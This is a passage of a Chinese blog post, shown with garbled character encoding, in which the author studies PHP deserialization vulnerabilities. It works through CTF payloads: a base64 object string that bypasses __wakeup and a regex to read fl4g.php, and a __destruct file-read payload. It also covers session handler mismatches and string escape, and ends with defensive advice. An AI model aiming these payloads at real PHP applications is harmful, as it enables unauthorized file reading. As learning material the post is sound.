<p>$fileæ˜¯ç§æœ‰æ–¹æ³• private,å‰é¢æåˆ°privateå±æ€§è¢«åºåˆ—åŒ–åå±æ€§åçš„å½¢å¼ä¸º**%00ç±»å%00å±æ€§å**,æˆ‘ä»¬çœ‹åˆ°fileæœ¬è¯¥æ˜¯4ä¸ªå­—ç¬¦ï¼Œåºåˆ—åŒ–åç¡®å®10ä¸ªå­—ç¬¦ã€‚æˆ‘å°è¯•åœ¨Demoå‰ååŠ %00å†ç¼–ç ï¼Œå¤±è´¥ï¼Œåæ¥çœ‹åˆ«äººçš„wpï¼Œæ‰æ‰¾åˆ°åŸå› ï¼Œ<strong>å› ä¸ºå¤åˆ¶ç²˜è´´æ—¶ç ´åäº† â€œ %00 â€œ è¿™ä¸ªç‰¹æ®Šå­—ç¬¦ã€‚ å°†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ç›´æ¥å­˜å…¥æ–‡ä»¶ä¸ä¼šç ´åè¿™ä¸ª â€œ %00 â€œ ç‰¹æ®Šå­—ç¬¦ã€‚</strong></p>
<pre><code class="line-numbers language-php">&lt;?php 
class Demo { 
    private $file = 'fl4g.php';
}

$c =new Demo($file);
$a=serialize($c);        //O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}

$a = str_replace(':1:', ':2:', $a);        //ç»•è¿‡wakeup
$a = str_replace('O:4', 'O:+4', $a);        //ç»•è¿‡æ­£åˆ™åŒ¹é…
print_r($a);
print_r("&lt;br&gt;");
var_dump(base64_encode($a));        //base64ç¼–ç 
//O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}&lt;br&gt;D:\phpstudy_pro\WWW\sleep.php:13:
//string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
</code></pre>
<p>æ‰€ä»¥æ„é€ payload:<strong>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</strong></p>
<blockquote>
<p>æ³¨æ„å­¦ä¹ è¿™ç§ç›´æ¥å†™phpå»å¾—åˆ°payloadçš„æ–¹æ³•ï¼Œå°¤å…¶æ˜¯ç¢°åˆ°privateå’Œprotectedæ—¶</p>
<p>æ­¤å¤„å†è´´ä¸€ç¯‡wp:<a target="_blank" rel="noopener" href="https://moreant.github.io/post/60542.html">æ”»é˜²ä¸–ç•Œ WEB Web_php_unserialize</a></p>
</blockquote>
<h5 id="4-é­”æœ¯æ–¹æ³•"><a href="#4-é­”æœ¯æ–¹æ³•" class="headerlink" title="4.é­”æœ¯æ–¹æ³•"></a>4.é­”æœ¯æ–¹æ³•</h5><p><strong>phpååºåˆ—åŒ–æ¼æ´è§¦å‘æ¡ä»¶ï¼š</strong> unserializeå‡½æ•°çš„å‚æ•°ã€å˜é‡å¯æ§ï¼Œphpæ–‡ä»¶ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ç±»ï¼Œç±»ä¸­æœ‰é­”æœ¯æ–¹æ³•</p>
<p>æ¥ä¸‹æ¥ä»‹ç»ä¸€äº›å¸¸è§çš„é­”æœ¯æ–¹æ³•ï¼ˆwakeup()å’Œsleep()å‡½æ•°åœ¨å‰é¢å·²ç»ä»‹ç»è¿‡äº†ï¼Œå°±ä¸å†è¯¦è¿°ï¼‰</p>
<pre><code>__construct() å½“å¯¹è±¡åˆ›å»ºï¼ˆnewï¼‰æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ä½†åœ¨ unserialize() æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„ã€‚

__destruct() å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯ï¼ˆååºåˆ—åŒ–ï¼‰æ—¶è¢«è°ƒç”¨

__toString() å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è¢«è°ƒç”¨

__sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰ç«‹å³è¿è¡Œ

__wakeup() å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨
</code></pre>
<h6 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h6><pre><code class="line-numbers language-php">&lt;?php
class xctf{
    public $flag = '111';
    function __construct() {
        echo ("Ab4ndon!");
    }
}
    
    $a = new xctf();
    
?&gt;
</code></pre>
<p>è¿è¡Œç»“æœï¼š<strong>Ab4ndon!</strong></p>
<p>å¯ä»¥å¾ˆæ¸…æ¥šåœ°çœ‹å‡ºæ¥construct()é­”æœ¯æ–¹æ³•åœ¨åˆ›å»ºå¯¹è±¡æ—¶è¿›è¡Œäº†è°ƒç”¨</p>
<h6 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h6><pre><code class="line-numbers language-php">&lt;?php
class Example {
    var $var = '';
    function __destruct() {
        highlight_file($this-&gt;var);  //å¸¸ç”¨æ–‡ä»¶è¯»å–å‡½æ•°ï¼šreadfileï¼ˆéœ€è¦å»æºç é‡Œçœ‹ï¼‰ highlight_file                                                                       show_source            file_get_contentsï¼ˆä¸ä¼šè¾“å‡ºï¼‰
    }
}
unserialize($_GET['a']);
/*$obj = new Example();            //å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶åºåˆ—åŒ–ï¼šO:7:"Example":1:{s:3:"var";s:8:"flag.php";}
$obj-&gt;var='flag.php';
var_dump(serialize($obj));
*/
?&gt;ã€€
    
    
  //flag.php
    &lt;?php
$flag="flag!!!!!";
</code></pre>
<p>payloadå¦‚ä¸‹ï¼š<code>?a=O:7:"Example":1:{s:3:"var";s:8:"flag.php";}</code></p>
<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/image-20201011115348580.png" alt="image-20201011115348580" style="zoom:67%;">

<h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><h5 id="5-sessionååºåˆ—åŒ–"><a href="#5-sessionååºåˆ—åŒ–" class="headerlink" title="5.sessionååºåˆ—åŒ–"></a>5.sessionååºåˆ—åŒ–</h5><p>åœ¨php.iniä¸­å­˜åœ¨ä¸‰é¡¹é…ç½®é¡¹ï¼š</p>
<ul>
<li><code>session.save_path=""</code> â€“è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„</li>
<li><code>session.save_handler=""</code> â€“<strong>è®¾å®šç”¨æˆ·è‡ªå®šä¹‰sessionå­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)</strong></li>
<li><code>session.auto_start boolen</code> â€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤ä¸º0ä¸å¯åŠ¨</li>
<li><code>session.serialize_handler string</code> â€“<strong>å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php (php&lt;5.5.4)</strong></li>
</ul>
<p><strong>åœ¨ä¸Šè¿°çš„é…ç½®ä¸­ï¼Œsession.serialize_handleræ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—åŒ–å¼•æ“çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚</strong></p>
<table>
<thead>
<tr>
<th>å¼•æ“</th>
<th>sessionå­˜å‚¨æ–¹å¼</th>
</tr>
</thead>
<tbody><tr>
<td>php(php&lt;5.5.4)</td>
<td>å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿`</td>
</tr>
<tr>
<td>php_serialize(php&gt;5.5.4)</td>
<td>å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„é”®å’Œå€¼ï¼ˆå°†sessionä¸­çš„keyå’Œvalueéƒ½ä¼šè¿›è¡Œåºåˆ—åŒ–ï¼‰</td>
</tr>
<tr>
<td>php_binary</td>
<td>å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
</tbody></table>
<p>åœ¨PHP (php&lt;5.5.4) ä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯PHPå¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œåªéœ€è¦æ·»åŠ ä»£ç <code>ini_set('session.serialize_handler', 'éœ€è¦è®¾ç½®çš„å¼•æ“å');</code>è¿›è¡Œè®¾ç½®ã€‚</p>
<p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="line-numbers language-php">&lt;?php
ini_set('session.serialize_handler', 'php_serialize');   //è®¾ç½®åºåˆ—åŒ–å¼•æ“ä½¿ç”¨php_serialize
session_start();
// do something
......
</code></pre>
<p><strong>ç”±äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰€ä½¿ç”¨çš„åºåˆ—åŒ–å¼•æ“ä¸ä¸€æ ·å°±æ˜¯é€ æˆPHP Sessionåºåˆ—åŒ–æ¼æ´çš„åŸå› </strong></p>
<p>ï¼ˆæ­¤å¤„ä½¿ç”¨çš„æ˜¯php7.3.4ntsï¼‰</p>
<ul>
<li>phpå¼•æ“</li>
</ul>
<pre><code class="line-numbers language-php">&lt;?php
ini_set('session.serialize_handler', 'php');
session_start();      // session_start()ä¼šåˆ›å»ºæ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯
$_SESSION['name'] = 'Ab4ndon';
var_dump();
?&gt;
</code></pre>
<p>å»æœ¬åœ°æ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°å­˜å‚¨sessionæ–‡ä»¶çš„åœ°æ–¹ï¼Œå¦‚æˆ‘çš„ï¼šD:\phpstudy_pro\Extensions\tmp\tmpï¼Œå‘ç°ä¸€ä¸ªsesså¼€å¤´çš„æ–‡ä»¶ï¼Œsess_åé¢æ˜¯PHPSESSIDçš„å€¼</p>
<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/image-20201011105453092.png" alt="image-20201011105453092" style="zoom:50%;">

<p>æ‰“å¼€ï¼Œå†…å®¹ä¸ºï¼š<strong>name|s:7:â€Ab4ndonâ€;</strong>     <strong>é”®å+ç«–çº¿<code>|</code>+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼ï¼ˆåªåºåˆ—åŒ–å€¼</strong>ï¼‰</p>
<ul>
<li>php_serializeå¼•æ“</li>
</ul>
<pre><code class="line-numbers language-php">&lt;?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();      // session_start()ä¼šåˆ›å»ºæ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯
$_SESSION['name'] = 'Ab4ndon';
var_dump();
?&gt;
</code></pre>
<p>æ–‡ä»¶å†…å®¹ï¼š<strong>a:1:{s:4:â€nameâ€;s:7:â€Ab4ndonâ€;}</strong>    <strong>a:1æ˜¯ä½¿ç”¨php_serializeè¿›è¡Œåºåˆ—è¯éƒ½ä¼šåŠ ä¸Šã€‚åŒæ—¶ä½¿ç”¨php_serializeä¼šå°†sessionä¸­çš„key(é”®)å’Œvalue(å€¼)éƒ½ä¼šè¿›è¡Œåºåˆ—åŒ–</strong>ã€‚</p>
<ul>
<li>php_binary</li>
</ul>
<pre><code class="line-numbers language-php">&lt;?php
ini_set('session.serialize_handler', 'php_binary');
session_start();      // session_start()ä¼šåˆ›å»ºæ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯
$_SESSION['name'] = 'Ab4ndon';
var_dump();
?&gt;
</code></pre>
<p>æ–‡ä»¶å†…å®¹ï¼š<strong>names:7:â€Ab4ndonâ€;</strong>      é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼.ç”±äºnameçš„é•¿åº¦æ˜¯4ï¼Œ4åœ¨ASCIIè¡¨ä¸­å¯¹åº”çš„å°±æ˜¯ã€‚æ ¹æ®php_binaryçš„å­˜å‚¨è§„åˆ™ï¼Œæœ€åå°±æ˜¯<code>names:7:"Ab4ndon";</code> </p>
<h5 id="6-å­—ç¬¦ä¸²é€ƒé€¸"><a href="#6-å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="6.å­—ç¬¦ä¸²é€ƒé€¸"></a>6.å­—ç¬¦ä¸²é€ƒé€¸</h5><img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/YqFpH1.png" alt="1" style="zoom:67%;">

<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™phpä¼šæ ¹æ®sæ‰€æŒ‡å®šçš„å­—ç¬¦é•¿åº¦å»è¯»å–åè¾¹çš„å­—ç¬¦ã€‚è€Œä¸”æœ€åå˜é‡é—­åˆéƒ½éœ€è¦åŒå¼•å·ä»¥åŠç»“æŸçš„èŠ±æ‹¬å·ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p>
<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></p>
<p>å’Œ</p>
<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}xxx</code>(xxxæ˜¯ä»»æ„çš„ä¸€ä¸²å­—ç¬¦)</p>
<p>ååºåˆ—åŒ–åçš„ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œphpåœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ˜¯ä¸¥æ ¼åœ°æŒ‰ç…§ä¸€å®šçš„æ ¼å¼å»è¿›è¡Œçš„ã€‚</p>
<p>å¦‚æœæŒ‡å®šçš„é•¿åº¦é”™è¯¯åˆ™ååºåˆ—åŒ–å°±ä¼šå¤±è´¥ã€‚</p>
<p>æµ‹è¯•å¦‚ä¸‹ï¼š</p>
<pre><code class="line-numbers language-php">&lt;?php
class xctf{
    public $flag = '111';
}
    
    $a = new xctf();
    $a_ser = serialize($a);   //O:4:"xctf":1:{s:4:"flag";s:3:"111";}

//print_r($a_ser);
$res=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"111";}');
$res2=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"111";}xxx');
$res3=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"11";}');
print_r($res);
print_r($res2);
print_r($res3);

?&gt;
</code></pre>
<pre><code>//è¾“å‡ºç»“æœ
xctf Object          //$res
(
    [flag] =&gt; 111
)
xctf Object            //$res2
(
    [flag] =&gt; 111
)
</code></pre>
<p>å¦‚æœæˆ‘ä»¬å°†111æ”¹ä¸º11ï¼Œå°±ä¼šååºåˆ—åŒ–å¤±è´¥ï¼Œæˆ‘çš„vscodeæ²¡æœ‰ä»»ä½•è¾“å‡ºã€‚</p>
<p>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºæ­¤æ—¶çš„flagæ‰€è¯»å–çš„æ•°æ®ä¸º11â€œè€Œ<strong>æ­£å¸¸çš„è¯­æ³•æ˜¯éœ€è¦ç”¨â€;å»é—­åˆå½“å‰çš„å˜é‡ï¼Œè€Œå› ä¸ºé•¿åº¦é”™è¯¯æ‰€ä»¥æ­¤æ—¶phpæŠŠé—­åˆçš„åŒå¼•å·å½“åšäº†å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ªå­—ç¬¦å°±æˆäº†åˆ†å·ï¼Œæ²¡èƒ½é—­åˆå¯¼è‡´æŠ›å‡ºäº†é”™è¯¯ã€‚</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sumarua/p/12932401.html"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sumarua/p/12932401.html">PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸è¯¦è§£</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hello-there/p/12870541.html">æµ…è°ˆPHPå­—ç¬¦ä¸²é€ƒé€¸</a></p>
<p>çŸ¥è¯†è¡¥å……<br>unserializeæ¼æ´ä¾èµ–å‡ ä¸ªæ¡ä»¶ï¼š</p>
<p>unserializeå‡½æ•°çš„å‚æ•°å¯æ§<br>è„šæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªæ„é€ å‡½æ•°ï¼ˆ__construct()ï¼‰ã€ææ„å‡½æ•°ï¼ˆ__destruct()ï¼‰ã€__wakeup()å‡½æ•°ä¸­æœ‰å‘phpæ–‡ä»¶ä¸­å†™æ•°æ®çš„æ“ä½œçš„ç±»<br>æ‰€å†™çš„å†…å®¹éœ€è¦æœ‰å¯¹è±¡ä¸­çš„æˆå‘˜å˜é‡çš„å€¼<br>é˜²èŒƒçš„æ–¹æ³•æœ‰ï¼š</p>
<ol start="4">
<li>ä¸¥æ ¼æ§åˆ¶unserializeå‡½æ•°çš„å‚æ•°ï¼ŒåšæŒç”¨æˆ·æ‰€è¾“å…¥çš„ä¿¡æ¯éƒ½æ˜¯ä¸å¯é çš„åŸåˆ™</li>
<li>å¯¹äºunserializeåçš„å˜é‡å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œä»¥ç¡®å®šå†…å®¹æ²¡æœ‰è¢«æ±¡æŸ“</li>
</ol>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        æ–‡ç« ä½œè€…:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Ab4nd0n</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        æ–‡ç« é“¾æ¥:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://kongcm.cn/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/">http://kongcm.cn/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        ç‰ˆæƒå£°æ˜:
                    </i>
                </span>
                <span class="reprint-info">
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ¥å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº
                    <a href="/about" target="_blank">Ab4nd0n</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Web/">
                                    <span class="chip bg-color">Web</span>
                                </a>
                            
                                <a href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                                    <span class="chip bg-color">PHPååºåˆ—åŒ–</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    

    

</div>

                </div>
            </div>
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>è¯„è®º</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'AxNbxfoIMrOxBzetVISTrmJe-gzGzoHsz',
        appKey: 'A77RycvQsXl5xql5DXHq4Wj9',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
    
</script>

<!-- Ö±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ -->
<div id="to_comment" class="comment-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#vcomments" title="Ö±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½">
        <i class="fas fa-comments"></i>
    </a>
</div>




    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/2021/03/17/GitQues/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/27.jpg" class="responsive-img" alt="åšå®¢å‘å¸ƒæ—¶ hexo d å‘½ä»¤æŠ¥é”™">
                        
                        <span class="card-title">åšå®¢å‘å¸ƒæ—¶ hexo d å‘½ä»¤æŠ¥é”™</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            hexo åšå®¢åœ¨hexo d éƒ¨ç½²æ—¶æŠ¥é”™
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-17
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Hexo/" class="post-category">
                                    Hexo
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Git/">
                        <span class="chip bg-color">Git</span>
                    </a>
                    
                    <a href="/tags/Hexo%E9%83%A8%E7%BD%B2/">
                        <span class="chip bg-color">Hexoéƒ¨ç½²</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                ä¸‹ä¸€ç¯‡&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/10/18/sqlilab/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="sqli-labs-master åˆ·é¢˜è®°å½•">
                        
                        <span class="card-title">sqli-labs-master åˆ·é¢˜è®°å½•</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            åˆ·é¢˜è®°å½•
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-18
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Web/">
                        <span class="chip bg-color">Web</span>
                    </a>
                    
                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
                        <span class="chip bg-color">SQLæ³¨å…¥</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- ä»£ç å—åŠŸèƒ½ä¾èµ– - å»¶è¿ŸåŠ è½½ç¡®ä¿jQueryå·²åŠ è½½ -->
<script>
    // ç­‰å¾…jQueryåŠ è½½å®Œæˆåå†åŠ è½½ä»£ç å—ç›¸å…³è„šæœ¬
    (function() {
        function loadScript(src, callback) {
            var script = document.createElement('script');
            script.src = src;
            if (callback) {
                script.onload = callback;
            }
            document.body.appendChild(script);
        }
        
